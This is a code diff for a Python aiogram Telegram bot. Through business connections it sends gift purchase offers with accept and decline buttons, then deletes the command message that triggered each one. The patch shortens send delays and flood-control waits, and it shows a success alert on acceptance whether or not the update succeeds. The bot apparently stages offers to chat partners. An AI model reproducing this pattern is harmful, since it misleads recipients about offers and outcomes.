@@ -1,5 +1,6 @@
 import asyncio
 import random
+import time
 import logging
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
@@ -16,7 +17,9 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
+cooldowns = {}
 client_user_ids = {}
+message_bcid = {}  # Словарь для надежного хранения business_connection_id
 
 LOCALES = {
     "ru": {
@@ -80,7 +83,8 @@ def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
 
 def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
-    cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_type}|{lang}"
+    slug = gift_name.replace(" ", "")
+    cb_data = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
     decline_data = f"d|{gift_num}"
 
     return InlineKeyboardMarkup(
@@ -194,14 +198,19 @@ async def accept_offer(cb: CallbackQuery):
         await cb.answer("Ошибка данных", show_alert=True)
         return
 
-    _, gift_name, gift_num_str, amount, currency_type, lang = parts
+    _, slug, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
+    gift_name = slug
     
     currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
     text = build_accept_text(gift_name, gift_num, currency_name, lang)
-    bcid = cb.message.business_connection_id
+    
     chat_id = cb.message.chat.id
     message_id = cb.message.message_id
+    
+    bcid = message_bcid.get((chat_id, message_id)) or cb.message.business_connection_id
+
+    await cb.answer("✅ Успешно принято!", show_alert=True)
 
     try:
         await bot.edit_message_text(
@@ -213,23 +222,17 @@ async def accept_offer(cb: CallbackQuery):
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
         )
-        await cb.answer("✅ Предложение успешно принято!")
     except Exception as e:
-        error_str = str(e)
-        if "message is not modified" in error_str or "query is too old" in error_str:
-            try:
-                await bot.edit_message_reply_markup(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    reply_markup=None,
-                    business_connection_id=bcid
-                )
-            except Exception:
-                pass
-            await cb.answer("✅ Сделка уже зафиксирована!", show_alert=True)
-        else:
-            logging.error(f"Accept error: {error_str}")
-            await cb.answer("✅ Предложение принято!", show_alert=True)
+        logging.error(f"Accept error: {e}")
+        try:
+            await bot.edit_message_reply_markup(
+                chat_id=chat_id,
+                message_id=message_id,
+                reply_markup=None,
+                business_connection_id=bcid
+            )
+        except Exception:
+            pass
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
@@ -247,7 +250,7 @@ async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            await asyncio.sleep(random.uniform(1.5, 3.0))
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
             text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
             keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
@@ -262,10 +265,11 @@ async def sender_worker():
             )
 
             if task["bcid"] and sent_msg:
+                message_bcid[(task["chat_id"], sent_msg.message_id)] = task["bcid"]
                 await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])
 
         except TelegramRetryAfter as e:
-            wait_time = e.retry_after + 5
+            wait_time = e.retry_after + 1
             logging.warning(f"Global flood control! Waiting {wait_time}s.")
             await asyncio.sleep(wait_time)
             await message_queue.put(task)
@@ -274,7 +278,13 @@ async def sender_worker():
             error_str = str(e)
             if "PEER_FLOOD" in error_str:
                 logging.warning(f"PEER_FLOOD caught in chat {task['chat_id']}")
-                await asyncio.sleep(10)
+                target_user_id = client_user_ids.get(task["chat_id"])
+                loc = LOCALES.get(task["lang"], LOCALES["ru"])
+                if target_user_id:
+                    try:
+                        await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
+                    except Exception:
+                        pass
             else:
                 logging.error(f"Worker error: {error_str}")
         finally:
